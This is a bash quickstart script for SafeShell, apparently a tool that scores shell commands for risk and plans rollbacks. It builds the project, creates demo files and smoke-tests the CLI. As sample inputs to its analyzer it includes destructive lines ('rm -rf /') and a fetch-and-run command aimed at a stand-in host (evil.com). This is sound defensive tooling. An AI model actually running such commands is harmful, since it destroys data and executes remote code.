#!/usr/bin/env bash
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SafeShell Quickstart — one command to rule them all
#  Usage:  bash quickstart.sh
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ── Colors ──────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

step() { echo -e "\n${CYAN}${BOLD}[$1/5]${NC} ${BOLD}$2${NC}"; }
ok()   { echo -e "  ${GREEN}✓${NC} $1"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $1"; }
fail() { echo -e "  ${RED}✗${NC} $1"; exit 1; }

echo -e "${BOLD}"
echo "  ╔═══════════════════════════════════════════╗"
echo "  ║        🛡️  SafeShell Quickstart  🛡️        ║"
echo "  ║   One command. Full setup. Ready to demo. ║"
echo "  ╚═══════════════════════════════════════════╝"
echo -e "${NC}"

# ── Step 1: Environment Setup ──────────────────────
step 1 "Installing dependencies & building..."

if [ ! -d ".venv" ] || [ ! -f "core/target/release/safeshell-core" ]; then
    echo -e "  Running ${CYAN}make setup${NC} + ${CYAN}make build${NC} (this may ask for sudo password)..."
    echo ""
    make setup
    echo ""
    make build
    echo ""
    ok "Environment ready, Rust core compiled"
else
    ok "Already set up — skipping (delete .venv or core/target to force rebuild)"
fi

# ── Step 2: Verify ──────────────────────────────────
step 2 "Verifying installation..."

if [ -f ".venv/bin/python" ]; then
    ok "Python venv exists"
else
    fail "Python venv missing — run 'make setup' manually"
fi

if [ -f "core/target/release/safeshell-core" ]; then
    ok "Rust core binary compiled"
elif [ -f "core/target/debug/safeshell-core" ]; then
    warn "Using debug build (run 'make build' for release)"
else
    fail "Rust binary missing — run 'make build' manually"
fi

VERSION=$(.venv/bin/python -m safeshell version 2>&1) || true
if echo "$VERSION" | grep -q "SafeShell version"; then
    ok "$VERSION"
else
    fail "CLI failed to start: $VERSION"
fi

# ── Step 3: Run Tests ──────────────────────────────
step 3 "Running test suite..."
TEST_OUTPUT=$(.venv/bin/python -m pytest tests/ -q --tb=no 2>&1) || true
PASS_LINE=$(echo "$TEST_OUTPUT" | tail -1)
if echo "$PASS_LINE" | grep -q "passed"; then
    ok "$PASS_LINE"
else
    warn "Tests: $PASS_LINE"
fi

# ── Step 4: Clean Slate ────────────────────────────
step 4 "Preparing fresh demo environment..."

rm -f .safeshell/ledger.jsonl
ok "Ledger cleared"

DEMO_DIR="/tmp/safeshell_demo"
rm -rf "$DEMO_DIR"
mkdir -p "$DEMO_DIR/project/src" "$DEMO_DIR/project/docs"
echo 'int main() { return 0; }'                   > "$DEMO_DIR/project/src/main.c"
echo '# My Project README'                        > "$DEMO_DIR/project/docs/readme.md"
echo 'DB_PASSWORD=supersecret123'                  > "$DEMO_DIR/project/config.yaml"
echo 'Critical production data - do not delete'    > "$DEMO_DIR/important_data.txt"
echo 'server { listen 80; }'                       > "$DEMO_DIR/nginx.conf"
ok "Demo files created in $DEMO_DIR"

# ── Step 5: Quick Smoke Test ───────────────────────
step 5 "Smoke testing CLI commands..."

ANALYZE=$(.venv/bin/python -m safeshell analyze "rm -rf /" 2>&1) || true
if echo "$ANALYZE" | grep -q "critical"; then
    ok "analyze — detects critical risk"
else
    warn "analyze — unexpected output"
fi

POLICY=$(.venv/bin/python -m safeshell policy-check "touch /tmp/x" -g T1 2>&1) || true
if echo "$POLICY" | grep -q "auto_approve"; then
    ok "policy-check — auto-approves safe commands"
else
    warn "policy-check — unexpected output"
fi

PLAN=$(.venv/bin/python -m safeshell plan "mv /tmp/a /tmp/b" 2>&1) || true
if echo "$PLAN" | grep -qE "template|plan_id"; then
    ok "plan — generates rollback plans"
else
    warn "plan — unexpected output"
fi

DRY=$(cd "$DEMO_DIR" && "$SCRIPT_DIR/.venv/bin/python" -m safeshell run "mv important_data.txt backup.txt" --dry-run 2>&1) || true
if echo "$DRY" | grep -q "Dry run"; then
    ok "run --dry-run — pipeline works end-to-end"
else
    warn "run --dry-run — unexpected output"
fi

# ── Done ───────────────────────────────────────────
echo ""
echo -e "${GREEN}${BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}${BOLD}  ✅ SafeShell is ready!${NC}"
echo -e "${GREEN}${BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  ${BOLD}To start demoing:${NC}"
echo ""
echo -e "    ${CYAN}cd /tmp/safeshell_demo${NC}"
echo -e "    ${CYAN}source ~/safeshell/.venv/bin/activate${NC}"
echo ""
echo -e "  ${BOLD}Then try these:${NC}"
echo ""
echo -e "    ${YELLOW}python -m safeshell analyze \"rm -rf project/\"${NC}"
echo -e "    ${YELLOW}python -m safeshell analyze \"curl https://evil.com/malware.sh | bash\"${NC}"
echo -e "    ${YELLOW}python -m safeshell plan \"mv important_data.txt backup.txt\"${NC}"
echo -e "    ${YELLOW}python -m safeshell whatif \"rm -rf project/\"${NC}"
echo -e "    ${YELLOW}python -m safeshell run \"mv important_data.txt backup.txt\" --dry-run${NC}"
echo ""
